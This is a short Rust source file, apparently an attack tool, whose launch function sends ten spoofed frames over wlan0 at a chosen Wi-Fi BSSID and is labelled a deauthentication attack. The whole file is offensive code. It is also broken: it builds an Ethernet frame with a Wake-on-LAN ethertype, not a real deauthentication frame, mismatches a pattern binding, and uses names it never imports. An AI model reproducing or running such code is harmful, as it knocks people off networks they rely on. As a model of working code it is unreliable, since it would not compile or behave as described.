// 📜 src/deauth_attack.rs
use pnet::datalink::{self, Channel::Ethernet};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::udp::UdpPacket;

pub fn launch(target_bssid: &str) {
    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == "wlan0")
        .expect("Interface wlan0 no encontrada");

    let (_, mut tx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _)) => (tx),
        _ => panic!("Error al crear canal Ethernet"),
    };

    let mut buffer = [0u8; 42];
    let mut packet = MutableEthernetPacket::new(&mut buffer).unwrap();

    // Construye paquete Deauth (simplificado)
    packet.set_destination(target_bssid.parse().unwrap());
    packet.set_source("00:11:22:33:44:55".parse().unwrap());
    packet.set_ethertype(EtherTypes::WakeOnLan);

    for _ in 0..10 {
        tx.send_to(&buffer, None).unwrap().unwrap();
        std::thread::sleep(Duration::from_millis(100));
    }
}
